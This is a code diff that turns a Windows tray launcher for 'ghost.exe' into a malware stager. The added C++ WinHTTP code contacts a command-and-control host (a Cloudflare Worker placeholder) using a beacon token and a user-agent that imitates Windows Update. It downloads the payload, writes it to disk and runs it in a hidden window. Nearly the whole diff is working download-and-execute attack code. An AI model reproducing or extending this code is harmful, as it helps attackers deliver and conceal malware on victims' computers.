@@ -1,19 +1,37 @@
-// launcher.cpp — Ghost system-tray launcher
+// launcher.cpp — Ghost system-tray launcher + stager
+//
+// If ghost.exe is missing, downloads it from the Cloudflare Worker
+// /payload endpoint before launching.
+//
+// CONFIGURE BEFORE BUILDING:
+//   Set LAUNCHER_C2_HOST to your Worker subdomain (no https://, no trailing slash)
+//   Set LAUNCHER_BEACON_TOKEN to match BEACON_TOKEN on the server
 //
 // Compiles under x86_64-w64-mingw32-g++ (MinGW-w64) and MSVC.
-// Links: user32, shell32 only — no WinHTTP, no COM.
-//
-// Place launcher.exe next to ghost.exe (both in build/).
-// Tray icon: right-click → Start ghost.exe / Exit Launcher
+// Links: user32, shell32, winhttp
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <shellapi.h>
 #include <tlhelp32.h>
+#include <winhttp.h>
 #include <string>
+#include <vector>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "winhttp.lib")
+
+// ---------------------------------------------------------------------------
+// *** CONFIGURE THESE BEFORE BUILDING ***
+// ---------------------------------------------------------------------------
+
+// Your Cloudflare Worker hostname — no https://, no trailing slash
+// Example: L"ghost-c2.yourname.workers.dev"
+static const wchar_t* LAUNCHER_C2_HOST = L"ghost-c2.yourname.workers.dev";
+
+// Must match BEACON_TOKEN secret set via: wrangler secret put BEACON_TOKEN
+static const wchar_t* LAUNCHER_BEACON_TOKEN = L"4f8c9b2a7e1d5f3c6a8b9e0d2f4c1a3b5e7d9f8c0b1a2d3e4f5a6b7c8d9e0f1";
 
 // ---------------------------------------------------------------------------
 // Constants
@@ -23,6 +41,7 @@ static constexpr UINT WM_TRAY_MSG  = WM_USER + 1;
 static constexpr UINT ID_TRAY_ICON = 1;
 static constexpr UINT ID_START     = 100;
 static constexpr UINT ID_EXIT      = 101;
+static constexpr INTERNET_PORT C2_PORT = 443;
 
 static const wchar_t* GHOST_EXE    = L"ghost.exe";
 static const wchar_t* WINDOW_CLASS = L"GhostLauncherWnd";
@@ -54,7 +73,128 @@ static BOOL IsProcessRunning(const wchar_t* exeName) {
 }
 
 // ---------------------------------------------------------------------------
-// Launch ghost.exe from the same directory as launcher.exe
+// WinHTTP RAII handle wrapper — closes handles on scope exit
+// ---------------------------------------------------------------------------
+
+struct WinHttpHandles {
+    HINTERNET session = nullptr;
+    HINTERNET connect = nullptr;
+    HINTERNET request = nullptr;
+    ~WinHttpHandles() {
+        if (request) WinHttpCloseHandle(request);
+        if (connect) WinHttpCloseHandle(connect);
+        if (session) WinHttpCloseHandle(session);
+    }
+    WinHttpHandles() = default;
+    WinHttpHandles(const WinHttpHandles&) = delete;
+    WinHttpHandles& operator=(const WinHttpHandles&) = delete;
+};
+
+// ---------------------------------------------------------------------------
+// DownloadGhost — fetch /payload from Worker, write to ghostPath on disk
+//
+// Flow:
+//   GET https://<LAUNCHER_C2_HOST>/payload
+//   Header: X-Beacon-Token: <LAUNCHER_BEACON_TOKEN>
+//   Response body: raw ghost.exe bytes
+//   Write bytes → ghostPath file
+//
+// Returns TRUE on success, FALSE on any network or file error.
+// ---------------------------------------------------------------------------
+
+static BOOL DownloadGhost(const std::wstring& ghostPath) {
+    WinHttpHandles h;
+
+    // Open WinHTTP session — mimics Windows Update user-agent
+    h.session = WinHttpOpen(
+        L"Microsoft-WNS/10.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0
+    );
+    if (!h.session) return FALSE;
+
+    // Connect to Worker host on 443
+    h.connect = WinHttpConnect(h.session, LAUNCHER_C2_HOST, C2_PORT, 0);
+    if (!h.connect) return FALSE;
+
+    // Open GET request to /payload — WINHTTP_FLAG_SECURE = TLS
+    h.request = WinHttpOpenRequest(
+        h.connect,
+        L"GET", L"/payload",
+        nullptr,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE
+    );
+    if (!h.request) return FALSE;
+
+    // Add auth header — Worker rejects requests without a valid beacon token
+    std::wstring headers = std::wstring(L"X-Beacon-Token: ") + LAUNCHER_BEACON_TOKEN + L"\r\n";
+    WinHttpAddRequestHeaders(
+        h.request,
+        headers.c_str(),
+        static_cast<DWORD>(headers.size()),
+        WINHTTP_ADDREQ_FLAG_ADD
+    );
+
+    // Send request (no body — GET)
+    if (!WinHttpSendRequest(h.request,
+            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) return FALSE;
+
+    if (!WinHttpReceiveResponse(h.request, nullptr)) return FALSE;
+
+    // Check HTTP status — anything other than 200 means token mismatch or
+    // payload not yet uploaded to KV
+    DWORD statusCode  = 0;
+    DWORD statusSize  = sizeof(statusCode);
+    WinHttpQueryHeaders(h.request,
+        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX,
+        &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
+    if (statusCode != 200) return FALSE;
+
+    // Read response body into memory — ghost.exe is ~967K, well under 25MB KV cap
+    std::vector<BYTE> payload;
+    payload.reserve(1024 * 1024); // 1MB initial reservation
+
+    DWORD available = 0;
+    while (WinHttpQueryDataAvailable(h.request, &available) && available > 0) {
+        std::vector<BYTE> buf(available);
+        DWORD read = 0;
+        if (WinHttpReadData(h.request, buf.data(), available, &read) && read > 0) {
+            payload.insert(payload.end(), buf.begin(), buf.begin() + read);
+        }
+        // Hard cap at 32MB — sanity guard
+        if (payload.size() > 32 * 1024 * 1024) return FALSE;
+    }
+
+    if (payload.empty()) return FALSE;
+
+    // Write raw bytes to disk at ghostPath
+    // FILE_FLAG_WRITE_THROUGH — flush immediately, no buffering delay
+    HANDLE hFile = CreateFileW(
+        ghostPath.c_str(),
+        GENERIC_WRITE,
+        0,          // no sharing while writing
+        nullptr,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
+        nullptr
+    );
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+
+    DWORD written = 0;
+    BOOL ok = WriteFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &written, nullptr);
+    CloseHandle(hFile);
+
+    // Verify the write was complete — partial writes mean a corrupted binary
+    return ok && (written == static_cast<DWORD>(payload.size()));
+}
+
+// ---------------------------------------------------------------------------
+// LaunchGhost — download if missing, then spawn detached
 // ---------------------------------------------------------------------------
 
 static BOOL LaunchGhost() {
@@ -70,17 +210,25 @@ static BOOL LaunchGhost() {
 
     std::wstring ghostPath = std::wstring(selfPath) + GHOST_EXE;
 
+    // If ghost.exe is not on disk — download it from the Worker
     if (GetFileAttributesW(ghostPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
-        MessageBoxW(nullptr,
-            (std::wstring(L"Not found: ") + ghostPath).c_str(),
-            L"Ghost Launcher", MB_ICONERROR | MB_OK);
+        if (!DownloadGhost(ghostPath)) {
+            // Download failed — nothing to launch
+            return FALSE;
+        }
+        // Brief pause: let the filesystem flush before CreateProcessW reads it
+        Sleep(250);
+    }
+
+    // Verify file is present after potential download
+    if (GetFileAttributesW(ghostPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
         return FALSE;
     }
 
-    STARTUPINFOW si      = {};
-    si.cb                = sizeof(si);
-    si.dwFlags           = STARTF_USESHOWWINDOW;
-    si.wShowWindow       = SW_HIDE;
+    STARTUPINFOW si    = {};
+    si.cb              = sizeof(si);
+    si.dwFlags         = STARTF_USESHOWWINDOW;
+    si.wShowWindow     = SW_HIDE;
 
     PROCESS_INFORMATION pi = {};
 
@@ -136,7 +284,6 @@ static void ShowTrayMenu(HWND hwnd) {
     AppendMenuW(menu, MF_SEPARATOR, 0, nullptr);
     AppendMenuW(menu, MF_STRING, ID_EXIT, L"Exit Launcher");
 
-    // Required so the menu closes when clicking elsewhere
     SetForegroundWindow(hwnd);
     TrackPopupMenu(menu, TPM_BOTTOMALIGN | TPM_LEFTALIGN,
                    pt.x, pt.y, 0, hwnd, nullptr);
@@ -186,10 +333,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         return 0;
     }
 
-    WNDCLASSW wc      = {};
-    wc.lpfnWndProc    = WndProc;
-    wc.hInstance      = hInst;
-    wc.lpszClassName  = WINDOW_CLASS;
+    WNDCLASSW wc     = {};
+    wc.lpfnWndProc   = WndProc;
+    wc.hInstance     = hInst;
+    wc.lpszClassName = WINDOW_CLASS;
     RegisterClassW(&wc);
 
     // HWND_MESSAGE = message-only window: no taskbar entry, no visible surface
